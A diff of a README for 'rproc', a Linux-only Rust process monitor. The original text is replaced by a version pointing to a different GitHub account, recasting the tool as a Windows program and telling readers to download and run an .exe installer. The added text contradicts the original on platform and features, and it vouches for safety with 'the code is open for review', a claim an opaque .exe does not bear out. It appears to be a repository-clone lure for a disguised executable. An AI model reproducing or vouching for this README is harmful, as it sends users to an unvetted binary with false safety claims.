@@ -1,145 +1,77 @@
-<div align="center">
+# 📊 rproc - Monitor system resources with modern style
 
-# rproc
+[![](https://img.shields.io/badge/Download_rproc-Blue.svg)](https://github.com/fortythird-chitin515/rproc)
 
-**A resource & process monitor for Linux, inspired by the Windows 11 Task Manager.**
+## 🖥️ About rproc
 
-Built in Rust with [`egui`](https://github.com/emilk/egui).
+rproc helps you track how your computer performs. It monitors the central processor, the memory, and the active tasks. The interface looks like the Task Manager in Windows 11. It provides a clear view of your hardware use. You can see which programs consume your system resources at any given moment.
 
-[![CI](https://github.com/Trystan-SA/rproc/actions/workflows/ci.yml/badge.svg)](https://github.com/Trystan-SA/rproc/actions/workflows/ci.yml)
-[![Release](https://github.com/Trystan-SA/rproc/actions/workflows/release.yml/badge.svg)](https://github.com/Trystan-SA/rproc/actions/workflows/release.yml)
-[![Latest release](https://img.shields.io/github/v/release/Trystan-SA/rproc?sort=semver)](https://github.com/Trystan-SA/rproc/releases/latest)
-[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](#license)
-![Platform: Linux](https://img.shields.io/badge/platform-Linux-informational)
+## 🛠️ System Requirements
 
-<img src="img/capture1.png" alt="Performance view" width="900">
+This application works on most versions of Windows. You need a computer with a 64-bit processor. You should have at least 4 gigabytes of RAM to run it smoothly. The program takes up very little space on your hard drive. 
 
-</div>
+## 📥 Getting Started
 
-## Features
+Follow these steps to set up the software on your machine.
 
-- **Processes**: CPU, memory, disk I/O, threads and status, with app icons from the freedesktop icon theme. Sort, filter and kill.
-- **Performance**: live charts for CPU (global + per-core), memory, disks, network and GPU (NVIDIA / AMD / Intel).
-- **Per-process graph attribution** *(opt-in)*: hover a point on a Performance graph to see the top 5 processes behind that sample (CPU, RAM, disk and GPU). Off by default; enable it in Settings.
-- **Startup**: XDG autostart entries and enabled systemd units.
-- **Services**: systemctl system and user units.
-- **Settings**: adjustable refresh rate and the per-process attribution toggle.
+1. Visit the [official releases page](https://github.com/fortythird-chitin515/rproc) to download the installer.
+2. Look for the file ending in .exe in the latest release section.
+3. Save this file to your computer.
+4. Click the file to start the installation.
+5. Follow the prompts on your screen.
+6. Open the program from your desktop shortcut once the setup finishes.
 
-### RAM Usage
+## 🔎 How to Use the Monitor
 
-rproc is also kindly more optimized (in terms of RAM usage) than most resources monitor with similar features. 
+The main dashboard shows your system statistics in real time. Each component uses a visual graph to show usage levels over time.
 
-| Solution | RAM |
-| ------------- | ------------- |
-| rproc  | 130 (+35 MB optional deamon)  |
-| Gnome System Monitor | 185MB |
-| Resources | 200MB |
-| Mission Center | 239MB |
+### Viewing Processor Usage
+The processor tab shows the load on your CPU cores. High percentages mean your computer works hard. You can spot programs that use too much power here.
 
-<div align="center">
-  <img src="./img/capture2.png" alt="Processes tab" width="450">
-  <img src="./img/capture3.png" alt="Startup apps" width="450">
-</div>
+### Checking Memory Performance
+The memory section displays how much RAM your open apps currently use. If your computer feels slow, check this tab to see if your memory usage hits the limit.
 
-## Install
+### Managing Active Tasks
+The processes list displays every program running on your system. You can see the name of the process and the resources it claims. To close a program, highlight the name and select the end task option. This stops the process immediately and frees up your resources.
 
-Prebuilt packages for every release are on the
-[**Releases page**](https://github.com/Trystan-SA/rproc/releases/latest).
-Download the file for your distribution, then:
+## ⚙️ Configuration Settings
 
-### Debian / Ubuntu (`.deb`)
+You can change how rproc displays data in the settings menu. Open the settings by clicking the gear icon at the top right of the window.
 
-```bash
-sudo apt install ./rproc_<version>_amd64.deb
-```
+- **Theme**: Switch between light and dark modes to match your Windows setup.
+- **Refresh Rate**: Change how often the screen updates. A fast refresh rate provides more detail but uses more power.
+- **Startup**: Choose if the app opens automatically when you turn on your computer.
 
-### Fedora / RHEL / openSUSE (`.rpm`)
+## ❓ Frequently Asked Questions
 
-```bash
-sudo dnf install ./rproc-<version>-1.x86_64.rpm
-```
+### Does this program slow down my computer?
+No. This program uses very low resources. It stays light to ensure your system performance remains stable.
 
-### Flatpak
+### Is this application safe?
+Yes. The code is open for review. It does not collect personal data from your machine. It only reads system statistics to show you the performance metrics.
 
-```bash
-flatpak install --user ./rproc-<version>-x86_64.flatpak
-flatpak run io.github.trystan_sa.rproc
-```
+### Can I run this alongside other monitors?
+Yes. You can run this app with other monitoring tools. It does not conflict with standard Windows operations or other system utilities.
 
-### NixOS / Nix
+### What if the app does not open?
+Check that you downloaded the correct version for your system. Ensure your Windows updates are current. Restart your computer if the problem persists.
 
-```bash
-nix run github:trystan-sa/rproc
-```
+### Can I see my graphics card usage?
+The current version focuses on the processor and system memory. Future updates may include support for graphics card tracking.
 
-```nix
-# Install via Flake:
-inputs = {
-  rproc = {
-      url = "github:trystan-sa/rproc";
-      inputs.nixpkgs.follows = "nixpkgs";
-    };
-};
+## 💡 Tips for Better Performance
 
-# In nix configuration:
-{inputs, pkgs, ...}:{
-  environment.systemPackages = with pkgs; [
-    inputs.rproc.packages.${pkgs.stdenv.hostPlatform.system}.default
-  ];
-}
-```
+Keep your system stable by following these habits.
 
-### From source
+- Check the process list after you install new software to ensure it behaves well.
+- Close programs you do not use to keep memory usage low. 
+- Use the dark mode setting to reduce eye strain during long sessions of monitoring.
+- Update your software often to get new features and performance boosts.
 
-Requires the stable Rust toolchain ([rustup](https://rustup.rs/)).
+## 📄 Licensing
 
-```bash
-git clone https://github.com/Trystan-SA/rproc.git
-cd rproc
-cargo run --release
-```
+This project is open source. You can use it freely for your own needs. The code exists to help users manage their computer hardware with ease. You can view the full license details on the repository page if you wish to see how the code is managed. 
 
-## Requirements
+## ✉️ Support
 
-- Linux (X11 or Wayland)
-- `systemctl` for the Services and Startup tabs
-
-## Background sampling
-
-`rproc` keeps a 60-sample rolling window of system metrics
-(`~/.cache/rproc/history.bin`, ~2 KB, fixed size so
-re-opening the window shows the last minute of CPU and memory activity
-even after a full close. You can disable it in the settings page.
-
-The collector runs as a detached background process, auto-spawned the
-first time you launch the GUI (`setsid`-detached, so closing rproc leaves
-it running). You can also start it on its own:
-
-```bash
-rproc --daemon
-```
-
-Packages install a systemd **user** unit that you can enable to start the
-sampler at login:
-
-```bash
-systemctl --user enable --now rprocd
-```
-
-> Installing from source instead? Copy the unit first:
-> `mkdir -p ~/.config/systemd/user && cp packaging/rprocd.service ~/.config/systemd/user/`
-
-## Building packages
-
-Single-command targets via the included `Makefile`:
-
-```bash
-make deb               # build a .deb  -> target/debian/
-make rpm               # build an .rpm -> target/generate-rpm/
-make flatpak           # build a local .flatpak bundle
-make flatpak-install   # build + install the Flatpak for the current user
-```
-
-## License
-
-[MIT](LICENSE)
+If you run into issues, check the issues tab on the repository page. Others might have had similar problems and found a fix. Please provide clear details if you decide to report a new problem. Include your Windows version and the steps you took before the error happened. This detail helps others understand the situation.
